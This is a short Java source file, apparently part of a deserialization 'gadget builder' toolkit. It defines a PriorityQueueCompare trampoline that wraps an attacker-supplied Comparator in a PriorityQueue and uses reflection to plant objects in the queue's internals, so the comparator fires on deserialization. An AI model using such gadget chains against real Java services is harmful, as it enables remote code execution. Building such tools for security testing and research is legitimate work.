package org.ses.gadgetbuilder.impl.trampolines.compare;

import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.util.Comparator;
import java.util.PriorityQueue;

public class PriorityQueueCompare implements CompareTrampoline {
    @Override
    public Object wrapPayload(Comparator payload, Object param1, Object param2) {

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, payload);
        // switch contents of queue
        try {
            Object[] queueArray = new Object[] {param1, param2};
            Reflections.setFieldValue(queue, "queue", queueArray);
            Reflections.setFieldValue(queue, "size", 2);
        } catch (Exception ignored) {
        }

        return queue;
    }
}
